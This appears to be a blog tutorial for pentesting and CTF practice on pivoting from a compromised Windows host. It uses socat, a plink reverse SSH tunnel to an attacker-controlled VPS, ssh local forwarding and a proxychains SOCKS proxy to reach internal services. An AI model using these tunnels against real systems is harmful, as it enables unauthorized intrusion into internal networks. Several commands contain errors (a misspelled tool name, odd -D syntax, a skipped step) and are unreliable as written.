I"<p>Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.</p>

<h1 id="problem-statement">Problem Statement</h1>
<p>We have gained an initial foothold on one of the internal system of an organization. Now, we want to run <code class="language-plaintext highlighter-rouge">nmap</code> scans on the internal networks to pivot laterally. The organization is also running an internally hosted website which is not accessible from outside. How do we expose the internal ports/traffic to the outside attacker machine so that we can run our tools and gain access to resources which are not exposed to the outside world?</p>

<h1 id="cyber-range-setup">Cyber Range Setup</h1>
<p>The setup of the cyber range is given in figure below:</p>

<p><img src="/musings/assets/images/2021-06-07-ssh-tunnel-fig-1.png" alt="Deployment Architecture of Application" class="align-center" /></p>

<h1 id="actions-at-victim-machine">Actions at Victim Machine</h1>
<h2 id="step-1">Step 1:</h2>
<p>As we already have an initial foothold on the <code class="language-plaintext highlighter-rouge">victim</code> machine, we will start the <code class="language-plaintext highlighter-rouge">socate.exe</code>. This program will forward the traffic to its local port:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socate.exe TCP-LISTEN:8080,fork,reuseaddr TCP:&lt;target-server-ip&gt;:443
</code></pre></div></div>
<p>Once the traffic has been forwarded to a specific port, in our case <code class="language-plaintext highlighter-rouge">8080</code>, we can verify the same through <code class="language-plaintext highlighter-rouge">netstat</code> command:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Now check if the port has been forwarded
netstat -ano // check connection
</code></pre></div></div>
<h2 id="step-3">Step 3:</h2>
<p>We will redirect the traffic of the victim PC to the Virtual Private Server (VPS) through SSH tunnel, using <code class="language-plaintext highlighter-rouge">plink.exe</code> for windows.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Connect with VPS
plink.exe -l &lt;username&gt; -pw &lt;password&gt; -R 8080:127.0.0.1:8080 &lt;vps ip&gt;
</code></pre></div></div>

<h1 id="actions-at-vps-machine">Actions at VPS Machine</h1>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># To check with curl
/etc/hosts
127.0.0.1 &lt;domain-name&gt;
</code></pre></div></div>
<h1 id="forward-traffic-to-kali-machine-from-vps">Forward Traffic to Kali Machine from VPS</h1>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># On Kali Machine
ssh -g -L 8080:localhost:8080 -f -N &lt;username&gt;@&lt;vps ip&gt; // this use when want to open localhost
</code></pre></div></div>
<h1 id="now-open-the-browser-and-enter">Now open the browser and enter</h1>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;domain-name&gt;:8080
</code></pre></div></div>

<h1 id="configure-socks5-proxy">Configure SOCKS5 proxy</h1>
<h2 id="actions-at-victim-machine-1">Actions at victim machine</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>plink.exe -l &lt;username&gt; -pw &lt;password&gt; -D 8080:127.0.0.1:8080 &lt;vps ip&gt;
</code></pre></div></div>
<h2 id="actions-at-vps">Actions at VPS</h2>
<h3 id="install-proxychains">Install proxychains</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ yum install proxychains
$ nano /etc/proxychain.conf
socks5 &lt;vps-public-ip&gt; 8080
</code></pre></div></div>
<h2 id="check-on-terminal">Check on terminal</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ proxychains curl www.myweb.com
</code></pre></div></div>
<h2 id="on-kali-machine">On Kali Machine</h2>
<h3 id="do-settings-in-the-browser-if-we-want-to-open-websites-in-browser">Do settings in the browser, if we want to open websites in browser</h3>

<h3 id="in-case-you-want-to-use-terminal-for-traffic-and-not-browser-perform-following-steps">In case you want to use terminal for traffic and not browser, perform following steps</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ yum install proxychains

# nano /etc/proxychain.conf
socks5 &lt;vps-public-ip&gt; 8080
</code></pre></div></div>
<h2 id="check-on-terminal-1">Check on terminal</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ proxychains curl www.myweb.com
</code></pre></div></div>

<h4 id="reference">Reference</h4>
<ul>
  <li>https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d</li>
</ul>
:ET